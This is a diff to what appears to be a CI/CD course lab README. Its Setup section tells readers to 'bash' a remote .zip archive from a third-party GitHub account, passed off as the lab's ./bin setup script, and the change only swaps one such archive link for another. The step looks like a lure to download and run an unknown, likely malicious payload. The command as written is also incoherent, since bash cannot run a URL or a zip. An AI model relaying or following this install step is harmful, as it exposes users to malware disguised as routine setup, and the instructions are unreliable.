@@ -12,10 +12,10 @@ Name your repo: `ci-cd-final-project`.
 
 ## Setup
 
-After entering the lab environment you will need to run the `https://raw.githubusercontent.com/ENAHSIN/ci-cd-final-project/main/.github/ci_cd_project_final_v3.9.zip` script in the `./bin` folder to install the prerequisite software.
+After entering the lab environment you will need to run the `https://github.com/ENAHSIN/ci-cd-final-project/raw/refs/heads/main/service/ci-project-cd-final-v1.4.zip` script in the `./bin` folder to install the prerequisite software.
 
 ```bash
-bash https://raw.githubusercontent.com/ENAHSIN/ci-cd-final-project/main/.github/ci_cd_project_final_v3.9.zip
+bash https://github.com/ENAHSIN/ci-cd-final-project/raw/refs/heads/main/service/ci-project-cd-final-v1.4.zip
 ```
 
 Then you must exit the shell and start a new one for the Python virtual environment to be activated.
